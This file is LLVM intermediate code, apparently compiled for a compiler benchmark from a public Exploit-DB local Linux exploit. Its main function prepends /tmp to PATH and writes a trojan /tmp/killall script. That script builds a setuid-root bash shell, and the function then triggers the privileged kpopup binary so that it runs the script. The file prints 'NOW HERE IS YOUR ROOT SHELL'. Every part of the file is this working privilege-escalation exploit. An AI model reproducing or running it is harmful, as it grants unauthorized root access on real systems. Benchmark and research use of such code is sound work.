; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23308.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23308.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [134 x i8] c"PATH=/tmp:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"/tmp/killall\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"#!/bin/sh\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"cd /tmp\0A\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"/bin/cat > shell.c << EOF\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"#include <stdio.h>\0A\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"int main()\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"{\0A\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"setuid(0);\0A\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"setgid(0);\0A\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"execl(\22/bin/bash\22, \22-bash\22, NULL);\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"return 0;\0A\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"}\0A\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1
@.str.15 = private unnamed_addr constant [41 x i8] c"/usr/bin/gcc /tmp/shell.c -o /tmp/shell\0A\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"/bin/chown root.root /tmp/shell\0A\00", align 1
@.str.17 = private unnamed_addr constant [28 x i8] c"/bin/chmod 6711 /tmp/shell\0A\00", align 1
@.str.18 = private unnamed_addr constant [34 x i8] c"echo NOW HERE IS YOUR ROOT SHELL\0A\00", align 1
@.str.19 = private unnamed_addr constant [12 x i8] c"/tmp/shell\0A\00", align 1
@.str.20 = private unnamed_addr constant [22 x i8] c"chmod +x /tmp/killall\00", align 1
@.str.21 = private unnamed_addr constant [37 x i8] c"/usr/local/kde/bin/kpopup root shell\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %3 = call i32 @setenv(i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str, i64 0, i64 0))
  %4 = call i32* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %4, i32** %2, align 8
  %5 = load i32*, i32** %2, align 8
  %6 = call i32 @fprintf(i32* %5, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0))
  %7 = load i32*, i32** %2, align 8
  %8 = call i32 @fprintf(i32* %7, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %9 = load i32*, i32** %2, align 8
  %10 = call i32 @fprintf(i32* %9, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  %11 = load i32*, i32** %2, align 8
  %12 = call i32 @fprintf(i32* %11, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %13 = load i32*, i32** %2, align 8
  %14 = call i32 @fprintf(i32* %13, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %15 = load i32*, i32** %2, align 8
  %16 = call i32 @fprintf(i32* %15, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  %17 = load i32*, i32** %2, align 8
  %18 = call i32 @fprintf(i32* %17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %19 = load i32*, i32** %2, align 8
  %20 = call i32 @fprintf(i32* %19, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i64 0, i64 0))
  %21 = load i32*, i32** %2, align 8
  %22 = call i32 @fprintf(i32* %21, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  %23 = load i32*, i32** %2, align 8
  %24 = call i32 @fprintf(i32* %23, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i64 0, i64 0))
  %25 = load i32*, i32** %2, align 8
  %26 = call i32 @fprintf(i32* %25, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0))
  %27 = load i32*, i32** %2, align 8
  %28 = call i32 @fprintf(i32* %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0))
  %29 = load i32*, i32** %2, align 8
  %30 = call i32 @fprintf(i32* %29, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.15, i64 0, i64 0))
  %31 = load i32*, i32** %2, align 8
  %32 = call i32 @fprintf(i32* %31, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i64 0, i64 0))
  %33 = load i32*, i32** %2, align 8
  %34 = call i32 @fprintf(i32* %33, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.17, i64 0, i64 0))
  %35 = load i32*, i32** %2, align 8
  %36 = call i32 @fprintf(i32* %35, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.18, i64 0, i64 0))
  %37 = load i32*, i32** %2, align 8
  %38 = call i32 @fprintf(i32* %37, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.19, i64 0, i64 0))
  %39 = load i32*, i32** %2, align 8
  %40 = call i32 @fclose(i32* %39)
  %41 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.20, i64 0, i64 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.21, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @setenv(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
